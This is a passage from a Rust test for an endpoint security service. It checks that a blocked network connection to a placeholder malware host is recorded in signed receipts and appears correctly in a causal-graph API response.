            decision_observation["event"]["action"],
            "network_extension_egress"
        );
        assert_eq!(
            decision_observation["event"]["target"],
            "malware.example.invalid:443"
        );
        assert_eq!(decision_observation["event"]["decision"], "blocked");
        assert_eq!(
            decision_observation["event"]["guard"],
            "network_extension_content_filter"
        );
        assert_eq!(payload["receiptCount"], 4);
        let observation_receipts = payload["observationReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing NetworkExtension observation receipts"));
        assert_eq!(observation_receipts.len(), 3);
        let flow_observation_id = flow_observation["observationId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing NetworkExtension flow observation id"));
        let flow_observation_receipt = observation_receipts
            .iter()
            .find(|receipt| {
                receipt["receipt"]["metadata"]["endpointDecision"]["decision"]["observationId"]
                    == flow_observation_id
            })
            .unwrap_or_else(|| panic!("missing NetworkExtension flow observation receipt"));
        let receipt: SignedReceipt = serde_json::from_value(flow_observation_receipt.clone())
            .unwrap_or_else(|e| {
                panic!("failed to decode NetworkExtension observation receipt: {e}")
            });
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing NetworkExtension observation metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "observation");
        assert_eq!(
            endpoint_decision["decision"]["observationId"],
            flow_observation_id
        );
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["providerId"],
            "macos.network_extension"
        );
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing NetworkExtension observation evidence"))
            .iter()
            .any(|item| item["key"] == "observationHash"));
        let policy_receipts = payload["policyDecisionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing NetworkExtension policy-decision receipts"));
        assert_eq!(policy_receipts.len(), 1);
        let receipt: SignedReceipt = serde_json::from_value(policy_receipts[0].clone())
            .unwrap_or_else(|e| {
                panic!("failed to decode NetworkExtension policy-decision receipt: {e}")
            });
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing NetworkExtension policy-decision metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "policy_decision");
        assert_eq!(endpoint_decision["decision"]["action"], "block");
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["providerId"],
            "macos.network_extension"
        );
        assert_eq!(endpoint_decision["actor"]["sessionId"], "session-ne-1");

        let body = serde_json::json!({ "observations": [] });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/causal-graph")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build NetworkExtension graph request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("NetworkExtension graph request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read NetworkExtension graph response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode NetworkExtension graph response: {e}"));
        let graph_nodes = payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing NetworkExtension graph nodes"));
        let network_node_id = graph_nodes
            .iter()
            .find_map(|(node_id, node)| {
                (node["kind"] == "network" && node["label"] == "malware.example.invalid:443")
                    .then_some(node_id.as_str())
            })
            .unwrap_or_else(|| panic!("missing NetworkExtension network node"));
        let policy_decision_node_id = graph_nodes
            .iter()
            .find_map(|(node_id, node)| {
                (node["kind"] == "policy_decision").then_some(node_id.as_str())
            })
            .unwrap_or_else(|| panic!("missing NetworkExtension policy decision node"));
        assert!(graph_nodes.values().any(|node| {
            node["kind"] == "network" && node["label"] == "malware.example.invalid:443"
        }));
        assert!(graph_nodes.values().any(|node| {
            node["kind"] == "dns_name" && node["label"] == "malware.example.invalid"
        }));
        let graph_edges = payload["graph"]["edges"]
            .as_array()
            .unwrap_or_else(|| panic!("missing NetworkExtension graph edges"));
        assert!(graph_edges
            .iter()
            .any(|edge| { edge["kind"] == "connected" && edge["to"] == network_node_id }));
        assert!(graph_edges.iter().any(|edge| {
            edge["kind"] == "related"
                && edge["from"] == network_node_id
                && edge["to"] == policy_decision_node_id
        }));
    }

